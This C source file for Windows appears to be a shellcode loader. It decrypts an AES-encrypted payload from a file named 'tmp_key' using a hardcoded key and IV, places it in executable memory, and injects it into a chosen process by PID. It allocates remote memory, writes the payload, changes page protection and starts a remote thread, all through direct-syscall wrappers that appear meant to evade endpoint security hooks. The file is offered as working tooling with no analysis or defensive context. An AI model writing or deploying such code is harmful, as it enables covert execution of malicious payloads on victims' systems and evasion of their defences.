#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/applink.c>
#include "syscalls.h"

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16



static inline int hex_char_to_int(unsigned char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        return;
    }
    
    
    for (size_t i = 0; i < len; i += 2) {
        int high = hex_char_to_int(hex_array[i]);
        int low = hex_char_to_int(hex_array[i + 1]);
        
        if (high == -1 || low == -1) {
            return;
        }
        
        decoded_string[i/2] = (high << 4) | low;
        
        // Print progress every 5MB
        // if ((i/2) % (5 * 1024 * 1024) == 0) {
        //     printf("[HEX] Processed %.2f MB\n", (float)i/(2 * 1024 * 1024));
        // }
    }
    
}


void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex,
                const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    
    // Pre-calculate lengths to avoid repeated strlen calls
    const size_t key_hex_len = strlen((const char *)aes_key_hex);
    const size_t iv_hex_len = strlen((const char *)aes_iv_hex);
    const size_t input_hex_len = strlen((const char *)input_hex);
    const size_t input_len = input_hex_len / 2;
    
    
    // Use stack allocation for small buffers
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    // Convert hex to binary only once
    hex_to_string(aes_key_hex, key_hex_len, aes_key);
    hex_to_string(aes_iv_hex, iv_hex_len, aes_iv);
    
    // Allocate input buffer
    unsigned char *input = malloc(input_len);
    if (!input) {
        return;
    }
    
    hex_to_string(input_hex, input_hex_len, input);
    
    // Pre-allocate the full output buffer
    const size_t block_size = EVP_MAX_BLOCK_LENGTH;
    const size_t max_output_size = input_len + block_size;
    
    unsigned char *full_plaintext = malloc(max_output_size);
    if (!full_plaintext) {
        free(input);
        return;
    }
    
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(input);
        free(full_plaintext);
        return;
    }
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(input);
        free(full_plaintext);
        return;
    }
    
    
    int plaintext_len;
    if (EVP_DecryptUpdate(ctx, full_plaintext, &plaintext_len, input, input_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(input);
        free(full_plaintext);
        return;
    }
    
    
    size_t total_plaintext_len = plaintext_len;
    
    int final_len;
    if (EVP_DecryptFinal_ex(ctx, full_plaintext + total_plaintext_len, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(input);
        free(full_plaintext);
        return;
    }
    
    total_plaintext_len += final_len;
    
    EVP_CIPHER_CTX_free(ctx);
    free(input);
    
    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

void InjectShellcode(DWORD pid, unsigned char* shellcode, size_t shellcode_len) {
    HANDLE hProcess = NULL;
    PVOID pAddr = NULL;
    SIZE_T size = shellcode_len;
    ULONG oldProtect = 0;
    HANDLE hThread = NULL;
    
    CLIENT_ID clientId = {0};
    clientId.UniqueProcess = (HANDLE)pid;

    OBJECT_ATTRIBUTES objectAttributes = { 0 };
    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);

    // Open the target process with appropriate access rights
    NTSTATUS status = Sw3NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (status != 0) {
        return;
    }


    // Allocate memory in the remote process
    status = Sw3NtAllocateVirtualMemory(hProcess, &pAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        CloseHandle(hProcess);
        return;
    }

    // Write the shellcode into the allocated memory
    status = Sw3NtWriteVirtualMemory(hProcess, pAddr, shellcode, shellcode_len, NULL);
    if (status != 0) {
        Sw3NtFreeVirtualMemory(hProcess, &pAddr, &size, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Change memory protection to allow execution
    status = Sw3NtProtectVirtualMemory(hProcess, &pAddr, &size, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        Sw3NtFreeVirtualMemory(hProcess, &pAddr, &size, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    // Create a remote thread to execute the shellcode
    status = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddr, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        Sw3NtFreeVirtualMemory(hProcess, &pAddr, &size, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }


    // Wait for the thread to complete
    status = Sw3NtWaitForSingleObject(hThread, FALSE, NULL);


    // Clean up resources
    Sw3NtFreeVirtualMemory(hProcess, &pAddr, &size, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

}

void xor_encrypt_decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

unsigned char* convert_shellcode(const char *shellcode, size_t *binary_length) {
    *binary_length = 0;
    for (const char *ptr = shellcode; *ptr; ptr++) {
        if (*ptr == '\\' && *(ptr + 1) == 'x') {
            (*binary_length)++;
            ptr += 3;
        }
    }

    unsigned char *binary_shellcode = NULL;
    SIZE_T regionSize = *binary_length;
    HANDLE processHandle = GetCurrentProcess();
    ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
    ULONG protect = PAGE_EXECUTE_READWRITE;
    NTSTATUS status = Sw3NtAllocateVirtualMemory(processHandle, (PVOID*)&binary_shellcode, 0, &regionSize, allocationType, protect);
    if (status != 0) {
        return NULL;
    }

    size_t index = 0;
    for (const char *ptr = shellcode; *ptr; ptr++) {
        if (*ptr == '\\' && *(ptr + 1) == 'x') {
            char high = *(ptr + 2);
            char low = *(ptr + 3);

            unsigned char byte = (unsigned char)((hex_char_to_int(high) << 4) | hex_char_to_int(low));

            binary_shellcode[index++] = byte;
            ptr += 3;
        }
    }

    SIZE_T bytesWritten = 0;
    status = Sw3NtWriteVirtualMemory(processHandle, binary_shellcode, binary_shellcode, *binary_length, &bytesWritten);
    if (status != 0 || bytesWritten != *binary_length) {
        return NULL;
    }

    return binary_shellcode;
}


unsigned char* load_shellcode_from_file(const char* filename, size_t* shellcode_len) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *shellcode_len = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* shellcode = NULL;
    SIZE_T regionSize = *shellcode_len;
    HANDLE processHandle = GetCurrentProcess();
    ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
    ULONG protect = PAGE_READWRITE;
    NTSTATUS status;

    status = Sw3NtAllocateVirtualMemory(processHandle, (PVOID*)&shellcode, 0, &regionSize, allocationType, protect);
    if (status != 0) {
        fclose(file);
        return NULL;
    }

    fread(shellcode, 1, *shellcode_len, file);
    fclose(file);

    return shellcode;
}

HANDLE OpenTargetProcess(DWORD pid) {
    HANDLE hProcess = NULL;
    CLIENT_ID clientId = {0};
    OBJECT_ATTRIBUTES objectAttributes = {0};

    clientId.UniqueProcess = (HANDLE)pid;

    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);

    NTSTATUS status = Sw3NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (status != 0) {
        return NULL;
    }

    CloseHandle(hProcess);

    return hProcess;
}

//int main(int argc, char *argv[]) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);

    LPWSTR* argv;
    int argc;
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    if (argc < 2) {
        return 0;
    }

    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char* decrypted_shellcode;
    size_t decrypted_shellcode_len = 0;

    unsigned char* encrypted_shellcode = NULL;
    size_t encrypted_shellcode_len = 0;

    encrypted_shellcode = load_shellcode_from_file("tmp_key", &encrypted_shellcode_len);
    if (!encrypted_shellcode) {
        return 0;
    }

    decrypt_aes(aes_key_hex, aes_iv_hex, encrypted_shellcode, &decrypted_shellcode, &decrypted_shellcode_len);

    size_t shellcode_binary_length = 0;
    unsigned char* shellcode_binary = convert_shellcode((const char*)decrypted_shellcode, &shellcode_binary_length);
    if (!shellcode_binary) {
        free(encrypted_shellcode);
        return 0;
    }


    if (wcscmp(argv[1], L"L$ L") == 0) {
        DWORD pid = GetCurrentProcessId();
        InjectShellcode(pid, shellcode_binary, shellcode_binary_length);
    } else {
        DWORD pid = wcstoul(argv[1], NULL, 10);
        if (pid == 0) {
            return 0;
        }
        InjectShellcode(pid, shellcode_binary, shellcode_binary_length);
    }

    Sw3NtFreeVirtualMemory(GetCurrentProcess(), &encrypted_shellcode, &encrypted_shellcode_len, MEM_RELEASE);
    Sw3NtFreeVirtualMemory(GetCurrentProcess(), &decrypted_shellcode, &decrypted_shellcode_len, MEM_RELEASE);
    Sw3NtFreeVirtualMemory(GetCurrentProcess(), &shellcode_binary, &shellcode_binary_length, MEM_RELEASE);

    FreeConsole();

    return 0;
}
